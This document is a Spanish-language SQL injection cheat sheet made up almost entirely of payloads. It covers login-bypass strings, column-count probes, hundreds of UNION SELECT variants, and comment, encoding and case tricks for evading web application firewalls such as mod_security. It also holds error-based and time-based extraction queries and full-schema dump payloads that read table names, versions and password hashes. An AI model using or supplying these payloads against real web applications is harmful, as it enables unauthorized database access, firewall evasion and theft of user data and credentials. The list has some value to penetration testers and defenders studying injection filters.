**sql injection
Payloads para sql inyection login bypass**
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--

' or ''-'
" or ""-"
" or true--
' or true--

admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*

Ejemplos de payloads sql injection
Detectar un error sql

' = %27
" = %22
# = %23
; = %3B

Detectar numero de columnas vulnerables

 ORDER BY 1-- 
 ORDER BY 2-- 
 ORDER BY 3-- 
 ORDER BY 4-- 
 ORDER BY 5-- 
 ORDER BY 6-- 
 ORDER BY 7-- 
 ORDER BY 8-- 
 ORDER BY 9-- 
 ORDER BY 10-- 
 
 ORDER BY 1# 
 ORDER BY 2# 
 ORDER BY 3# 
 ORDER BY 4# 
 ORDER BY 5# 
 ORDER BY 6# 
 ORDER BY 7# 
 ORDER BY 8# 
 ORDER BY 9# 
 ORDER BY 10# 

Union Select Payloads

 UNION SELECT 1
 UNION SELECT 1,2
 UNION SELECT 1,2,3
 UNION SELECT 1,2,3,4
 UNION SELECT 1,2,3,4,5
 UNION SELECT 1,2,3,4,5,6
 UNION SELECT 1,2,3,4,5,6,7

 UNION ALL SELECT 1
 UNION ALL SELECT 1,2
 UNION ALL SELECT 1,2,3
 UNION ALL SELECT 1,2,3,4
 UNION ALL SELECT 1,2,3,4,5
 UNION ALL SELECT 1,2,3,4,5,6
 UNION ALL SELECT 1,2,3,4,5,6,7
 
 UNION(SELECT 1)
 UNION(SELECT 1,2)
 UNION(SELECT 1,2,3)
 UNION(SELECT 1,2,3,4)
 UNION(SELECT 1,2,3,4,5)
 UNION(SELECT 1,2,3,4,5,6)
 UNION(SELECT 1,2,3,4,5,6,7)
 
 UNION ALL(SELECT 1)
 UNION ALL(SELECT 1,2)
 UNION ALL(SELECT 1,2,3)
 UNION ALL(SELECT 1,2,3,4)
 UNION ALL(SELECT 1,2,3,4,5)
 UNION ALL(SELECT 1,2,3,4,5,6)
 UNION ALL(SELECT 1,2,3,4,5,6,7)
 
 AND 1 UNION SELECT 1
 AND 1 UNION SELECT 1,2
 AND 1 UNION SELECT 1,2,3
 AND 1 UNION SELECT 1,2,3,4
 AND 1 UNION SELECT 1,2,3,4,5
 AND 1 UNION SELECT 1,2,3,4,5,6
 AND 1 UNION SELECT 1,2,3,4,5,6,7


Union Select + sleep() + BENCHMARK(1000000,MD5('A')) Payloads
 UNION SELECT @@VERSION,SLEEP(5),3
 UNION SELECT @@VERSION,SLEEP(5),USER(),4
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7
 UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8
 
tecnicas para hacer bypass en sql inyection
bypass usando comentarios
 /*!UNION*/ /*!SELECT*/ 1
 /*!UNION*/ /*!SELECT*/ 1,2
 /*!UNION*/ /*!SELECT*/ 1,2,3
 /*!UNION*/ /*!SELECT*/ 1,2,3,4
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/ /*!12345SELECT*/ 1
 /*!12345UNION*/ /*!12345SELECT*/ 1,2
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
 /*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
 
 /*!12345UNION*/(/*!12345SELECT*/ 1)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
 /*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)

bypass usando comentarios + url encoding
 /*!%55nion*/%20/*!%53elect*/1
 /*!%55nion*/%20/*!%53elect*/%201,2
 /*!%55nion*/%20/*!%53elect*/%201,2,3
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
 /*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
 
 /*!12345%55nion*/ /*!12345%53elect*/ 1
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2
 /*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
 /*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
 
 /*!12345%55nion*/(/*!12345%53elect*/ 1)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
 /*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)

Information_schema.tables
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
Concat
CoNcAt()
concat() 
CON%08CAT()
CoNcAt()
%0AcOnCat()
/**//*!12345cOnCat*/
/*!50000cOnCat*/(/*!*/)
unhex(hex(concat(table_name)))
unhex(hex(/*!12345concat*/(table_name)))
unhex(hex(/*!50000concat*/(table_name)))
group_concat
/*!group_concat*/()
gRoUp_cOnCAt()
group_concat(/*!*/)
group_concat(/*!12345table_name*/)
group_concat(/*!50000table_name*/)
/*!group_concat*/(/*!12345table_name*/)
/*!group_concat*/(/*!50000table_name*/)
/*!12345group_concat*/(/*!12345table_name*/)
/*!50000group_concat*/(/*!50000table_name*/)
/*!GrOuP_ConCaT*/()
/*!12345GroUP_ConCat*/()
/*!50000gRouP_cOnCaT*/()
/*!50000Gr%6fuP_c%6fnCAT*/()
unhex(hex(group_concat(table_name)))
unhex(hex(/*!group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(table_name)))
unhex(hex(/*!12345group_concat*/(/*!table_name*/)))
unhex(hex(/*!12345group_concat*/(/*!12345table_name*/)))
unhex(hex(/*!50000group_concat*/(table_name)))
unhex(hex(/*!50000group_concat*/(/*!table_name*/)))
unhex(hex(/*!50000group_concat*/(/*!50000table_name*/)))
convert(group_concat(table_name)+using+ascii)
convert(group_concat(/*!table_name*/)+using+ascii)
convert(group_concat(/*!12345table_name*/)+using+ascii)
convert(group_concat(/*!50000table_name*/)+using+ascii)
CONVERT(group_concat(table_name)+USING+latin1)

Union Select
/*!50000%55nIoN*/ /*!50000%53eLeCt*/
%55nion(%53elect 1,2,3)-- -
+union+distinct+select+
+union+distinctROW+select+
/**//*!12345UNION SELECT*//**/
/**//*!50000UNION SELECT*//**/
/**/UNION/**//*!50000SELECT*//**/
/*!50000UniON SeLeCt*/
union /*!50000%53elect*/
+ #?uNiOn + #?sEleCt
+ #?1q %0AuNiOn all#qa%0A#%0AsEleCt
/*!%55NiOn*/ /*!%53eLEct*/
/*!u%6eion*/ /*!se%6cect*/
+un/**/ion+se/**/lect
uni%0bon+se%0blect
%2f**%2funion%2f**%2fselect
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
REVERSE(noinu)+REVERSE(tceles)
/*--*/union/*--*/select/*--*/
union (/*!/**/ SeleCT */ 1,2,3)
/*!union*/+/*!select*/
union+/*!select*/
/**/union/**/select/**/
/**/uNIon/**/sEleCt/**/
+%2F**/+Union/*!select*/
/**//*!union*//**//*!select*//**/
/*!uNIOn*/ /*!SelECt*/
+union+distinct+select+
+union+distinctROW+select+
uNiOn aLl sElEcT
UNIunionON+SELselectECT
/**/union/*!50000select*//**/
0%a0union%a0select%09
%0Aunion%0Aselect%0A
%55nion/**/%53elect
uni<on all="" sel="">/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/
%0A%09UNION%0CSELECT%10NULL%
/*!union*//*--*//*!all*//*--*//*!select*/
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!20000%0d%0aunion*/+/*!20000%0d%0aSelEct*/
+UnIoN/*&a=*/SeLeCT/*&a=*/
union+sel%0bect
+uni*on+sel*ect+
+#1q%0Aunion all#qa%0A#%0Aselect
union(select (1),(2),(3),(4),(5))
UNION(SELECT(column)FROM(table))
%23xyz%0AUnIOn%23xyz%0ASeLecT+
%23xyz%0A%55nIOn%23xyz%0A%53eLecT+
union(select(1),2,3)
union (select 1111,2222,3333)
uNioN (/*!/**/ SeleCT */ 11)
union (select 1111,2222,3333)
+#1q%0AuNiOn all#qa%0A#%0AsEleCt
/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/
%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/
+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C
/*!f****U%0d%0aunion*/+/*!f****U%0d%0aSelEct*/
+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+
/*!blobblobblob%0d%0aunion*/+/*!blobblobblob%0d%0aSelEct*/
/union\sselect/g
/union\s+select/i
/*!UnIoN*/SeLeCT
+UnIoN/*&a=*/SeLeCT/*&a=*/
+uni>on+sel>ect+
+(UnIoN)+(SelECT)+
+(UnI)(oN)+(SeL)(EcT)
+’UnI”On’+'SeL”ECT’
+uni on+sel ect+
+/*!UnIoN*/+/*!SeLeCt*/+
/*!u%6eion*/ /*!se%6cect*/
uni%20union%20/*!select*/%20
union%23aa%0Aselect
/**/union/*!50000select*/
/^.*union.*$/ /^.*select.*$/
/*union*/union/*select*/select+
/*uni X on*/union/*sel X ect*/
+un/**/ion+sel/**/ect+
+UnIOn%0d%0aSeleCt%0d%0a
UNION/*&test=1*/SELECT/*&pwn=2*/
un?<ion sel="">+un/**/ion+se/**/lect+
+UNunionION+SEselectLECT+
+uni%0bon+se%0blect+
%252f%252a*/union%252f%252a /select%252f%252a*/
/%2A%2A/union/%2A%2A/select/%2A%2A/
%2f**%2funion%2f**%2fselect%2f**%2f
union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
/*!UnIoN*/SeLecT+

HTML URL Encode (Codificación Url)
union select:

u	= %75
n	= %6e
i	= %69
o	= %6f
n	= %6e
space	= %20
s	= %73
e	= %65
l	= %6c
c	= %63
t	= %74

Sql payloads
/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+

+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+

SELECT * FROM (SELECT count(*), CONCAT((SELECT database()), 0x23, FLOOR(RAND(0)*2)) AS x FROM information_schema.columns GROUP BY x) y --

+uNiOn+(/*!/**/SeleCT*/+1,22,333...)+--+

%55%6e%49%6f%4e(/*!/**/%20SeleCT%20*/%2011,22,33,44,55,66,77,88,90,1010,1111,1212,1313,1414,1515,1616,1717,1818,1919....)

+/*✓*/UnIoN/*✓*/+/*✓*/AlL/*✓*/+(SeLeCt+1,2,3,%27soy%20vulnerable%27,5,6.....)+--+

+div+@a:=(current_user/**_**/())+UNION/**/DISTINCTROW+SELECT+1,2,@a,4+--+

%75nion/**)!*/sele%63%74/**)!*/+1,2,3....

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4,5--

+union(select+1,2,3,4,concat(column_name),6,...+from+information_schema.columns+where+table_name=%22columna%22+limit+1,1)+--+

+union(select+1,2,3,database(),concat(hash,0x3a,hash),6..+from(columna))+--+

Inyecciónes sql usando funciones sql
Sql inyection payload usando la función RPAD y SOUNDS LIKE
SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()

Sql inyection payload usando upper + reverse + right + sounds like para extraer información
select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()

Sql inyection usando elt, doble Reverse, hex y unhex
Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables

Sql inyection case
SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables

SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables

SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
SQL IF Function
SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables

select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
SQL IFNULL
SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
SQL NULLIF
SELECT NULLIF(table_name,2) from information_schema.tables
Sql inyection payload usando upper + reverse + right + sounds like
select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()

SQL injection usando doble reverse + right + if statement + HTML injection
SELECT reverse(reverse(right(if(1=1,table_name,'<h3><font color=blue> Tablas:</h3>'),100))) from information_schema.tables

Sql inyection usando las funciones HEX-UNHEX
SELECT UNHEX(HEX(table_name))from information_schema.tables

Inyección sql tipo error based usando Extractvalue
1%20and+extractvalue(rand(),concat(0x7e,version(),0x7e,user()))--

Sql inyection payload usando reverse
reverse(right(reverse(data),1))

Sql inyection payload usando extractvalue
extractvalue(rand(),concat(CHAR(126),database(),CHAR(126)))

Sql inyection payload + url encode + timing
-7 %23%0AAND 0--%0A /*!12345UNION*/ /*!12345ALL*/ (/*!12345SELECT*/ 1,sleep(5),'soy vulnerable',BENCHMARK(1000000,MD5('true')),5,6,7,8,9,10,11,12,13)

JSON Generation Functions
select JSON_OBJECT(1, @@version)

select json_array(current_user())

select json_objectagg(1, @@datadir)

select json_arrayagg('_Y000!_')

Mezclas
select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))

SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'

SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'

select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)

select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables

SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables

select IF(IFNULL(0,'a'),'NO es nulo',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables

Select if(substring(@@version,'1','1') = "5", 'si', 'no')

Select Unhex(hex(WEIGHT_STRING(table_name))) as 'tables' from information_schema.tables where table_name regexp '^[a | b]'

select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables

select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)

SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables

SELECT version() FROM (SELECT(SLEEP(5))) a

SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','_Y000!_',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a

SELECT TRIM(UpdateXML(CONCAT('.',database(),'--',(SELECT (ELT(1=1,@@version))),concat('--',@@datadir)), '_Y000_', '1111'))

SELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) y

Select if(now()=sysdate(),(select table_name),0) from information_schema.tables

select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))

SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x

Sql inyection + dios sql
/*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..

(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)

CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
Sql inyection Buffer Overflow / Firewall Crash bypass + xss inyection
+and+(select%201)=(Select%200xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa....)+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4,....+--+

sql inyection payload+ bypass Mod_Security
/*!50000un0x696fn*/+/*!12345AlL*/(/*!50000se0x6c65ct*/+1)+--+

/*!50000%75%6e%69on*/ %73%65%6cect 1,2,3,4...

/*!12345UnioN*//**/(/*!12345seLECT*//**/1)+--

/*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)+--+

Sql inyection payload + comment + hex/unhex
/*!50000select*/unhex(hex(/*!12345concat*/(0x223e,version(),0x223e,database())))

Sql inyection payload + url encode
+/*!12120%55%6e%49%6f%4e*/+(%53%65%4c%65%43%74+111,222,333,database(),555,...)+--+
